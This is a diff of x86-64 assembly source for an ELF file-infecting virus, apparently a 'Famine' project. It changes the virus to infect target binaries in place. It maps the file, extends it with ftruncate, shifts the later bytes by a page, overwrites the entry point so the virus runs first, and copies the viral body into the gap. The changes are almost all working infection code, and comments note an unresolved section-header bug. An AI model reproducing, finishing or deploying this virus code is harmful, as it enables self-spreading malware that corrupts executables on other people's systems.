@@ -41,7 +41,6 @@ _start:
 
 _file:
 	; === open(filename, O_RDWR, 0) | (path must be in rdi) ===
-	
 	lea rdi, [rel target_file]
 	mov rax, SYS_OPEN
 	mov rsi, O_RDWR
@@ -61,7 +60,7 @@ _file:
 	jl _return
 	mov FAM(famine.fsize), rax
 
-	; === mmap(0, filesize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0) ===
+	; === mmap(0, filesize, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0) ===
 	xor rdi, rdi
 	mov rsi, rax
 	mov rdx, PROT_READ | PROT_WRITE
@@ -81,7 +80,35 @@ _file:
 	cmp byte [rax + 0x4], 0x2
 	jne _return
 
+	; === Close the mapping with munmap ===
+	mov rdi, rax
+	mov rsi, FAM(famine.fsize)
+	mov rax, SYS_MUNMAP
+	syscall
+
+	; === Truncate the file to add 4096 bytes (syscall ftruncate) ===
+	mov rdi, r8
+	mov rsi, FAM(famine.fsize)
+	add rsi, PAGE_SIZE
+	mov rax, SYS_FTRUNCATE
+	syscall
+
+	; === Generate a new mapping MAP_SHARED of the extended file to modify it ===
+	xor rdi, rdi
+	mov rsi, FAM(famine.fsize)
+	add rsi, PAGE_SIZE
+	mov rdx, PROT_READ | PROT_WRITE
+	mov r10, MAP_SHARED
+	xor r9, r9
+	mov rax, SYS_MMAP
+	syscall
+	mov FAM(famine.map_ptr), rax
+	cmp rax, 0
+	jl _return
+
+
 	; === Getting the segments offset in file ===
+	mov rax, FAM(famine.map_ptr)
 	add rax, elf64_ehdr.e_phoff
 
 	; === Finding the text segment in file ===
@@ -186,35 +213,64 @@ _file:
 
 
 	_patch_elf_header:
-	mov rax, FAM(famine.map_ptr)
+	mov rax, FAM(famine.map_ptr)		; [sections OK]
 	add rax, elf64_ehdr.e_shoff
 	mov rdi, [rax]
 	cmp r13, rdi
 	jge _write
 	add qword [rax], PAGE_SIZE
 
-	_write:
-	; === Open outfile ===
-	lea rdi, [rel out_file]
-	mov rsi, O_WRONLY | O_CREAT | O_APPEND
-	mov rdx, 0x1FF
-	mov rax, SYS_OPEN
-	syscall
 
-	mov rdi, rax						; Writing until injection point
-	mov rsi, FAM(famine.map_ptr)
-	mov rdx, r13
-	mov rax, SYS_WRITE
-	syscall
+	_write:								; Check integrity of sections (section 19 [x /x (0x7ffff7ff4000 + 6432 + 48 + (0x40 * 19))] ) before copying
+	mov rsi, FAM(famine.map_ptr)		; and after copying. Something seems to modify section headers (before moving the bytes ? During ?)
+	add rsi, FAM(famine.fsize)
 
-	lea rsi, [rel _start]				; Writing the virus at injection point
-	mov rdx, VIRUS_SIZE
-	mov rax, SYS_WRITE
-	syscall
+	mov rdi, rsi
+	add rdi, PAGE_SIZE
+
+	mov rcx, FAM(famine.map_ptr)
+	add rcx, FAM(famine.fsize)
+
+	mov rax, FAM(famine.map_ptr)
+	add rax, FAM(famine.txt_offset)
+	add rax, FAM(famine.txt_filesz)
+	add rax, FAM(famine.gap_size)
+
+	sub rcx, rax						; rcx has length to move
+	inc rcx
+	std
+	rep movsb							; shift by 4096 bytes
+
+	; === Patch ELF entry point ===
+	mov rax, FAM(famine.map_ptr)
+	add rax, elf64_ehdr.e_entry
+	mov rsi, [rax]
+	mov FAM(famine.orig_entry), rsi
+	mov rdi, FAM(famine.txt_vaddr)
+	add rdi, FAM(famine.txt_filesz)
+	mov r13, rdi
+	mov [rax], rdi
+
+
+	; === Writing virus ===
+	mov rdi, FAM(famine.map_ptr)
+	add rdi, FAM(famine.txt_offset)
+	add rdi, FAM(famine.txt_filesz)
+	lea rsi, [rel _start]
+	mov rcx, VIRUS_SIZE
+	cld
+	repnz movsb
+
+	mov qword [rdi - 8], r13
+	mov r14, FAM(famine.orig_entry)
+	mov qword [rdi - 16], r14
 
 	; Calculating necessary padding		r13 still has injection_point offset
 	;									r12 has gap_size
 	;									r11 has VIRUS_SIZE
+	mov r13, FAM(famine.txt_offset)
+	add r13, FAM(famine.txt_filesz)
+	
 	mov r12, FAM(famine.gap_size)		
 	mov r11, VIRUS_SIZE
 
@@ -230,24 +286,74 @@ _file:
 	sub r10, r9
 
 	lea rsi, FAM(famine.padding)		; Writing padding
-	mov rdx, r10
-	mov rax, SYS_WRITE
-	syscall
+	mov rdi, FAM(famine.map_ptr)
+	add rdi, r9
 
-	mov rsi, FAM(famine.map_ptr)		; Writing rest of parent file
-	add rsi, FAM(famine.txt_offset)
-	add rsi, FAM(famine.txt_filesz)
-	add rsi, FAM(famine.gap_size)
-	mov rdx, FAM(famine.fsize)
-	sub rdx, FAM(famine.txt_offset)
-	sub rdx, FAM(famine.txt_filesz)
-	sub rdx, FAM(famine.gap_size)
-	mov rax, SYS_WRITE
-	syscall
+
+	mov rcx, r10
+	rep movsb
 
 
 
-	jmp _exit
+
+
+
+
+;	_write:
+	; === Open outfile ===
+;	lea rdi, [rel out_file]
+;	mov rsi, O_WRONLY | O_CREAT | O_APPEND
+;	mov rdx, 0x1FF
+;	mov rax, SYS_OPEN
+;	syscall
+
+;	mov rdi, rax						; Writing until injection point
+;	mov rsi, FAM(famine.map_ptr)
+;	mov rdx, r13
+;	mov rax, SYS_WRITE
+;	syscall
+
+;	lea rsi, [rel _start]				; Writing the virus at injection point
+;	mov rdx, VIRUS_SIZE
+;	mov rax, SYS_WRITE
+;	syscall
+
+	; Calculating necessary padding		r13 still has injection_point offset
+	;									r12 has gap_size
+	;									r11 has VIRUS_SIZE
+;	mov r12, FAM(famine.gap_size)		
+;	mov r11, VIRUS_SIZE
+
+;	mov r10, r13						; r10 --> upper limit
+;	add r10, r12
+;	add r10, PAGE_SIZE
+
+;	sub r11, r12						; ATTENTION ici si VIRUS_SIZE est inférieur à gap_size !
+
+;	mov r9, r13
+;	add r9, r12
+;	add r9, r11							; r9 --> injection_point + gap_size + (VIRUS_SIZE - gap_size)
+;	sub r10, r9
+
+;	lea rsi, FAM(famine.padding)		; Writing padding
+;	mov rdx, r10
+;	mov rax, SYS_WRITE
+;	syscall
+
+;	mov rsi, FAM(famine.map_ptr)		; Writing rest of parent file
+;	add rsi, FAM(famine.txt_offset)
+;	add rsi, FAM(famine.txt_filesz)
+;	add rsi, FAM(famine.gap_size)
+;	mov rdx, FAM(famine.fsize)
+;	sub rdx, FAM(famine.txt_offset)
+;	sub rdx, FAM(famine.txt_filesz)
+;	sub rdx, FAM(famine.gap_size)
+;	mov rax, SYS_WRITE
+;	syscall
+
+
+
+	jmp _return
 
 
 _is_text_segment:
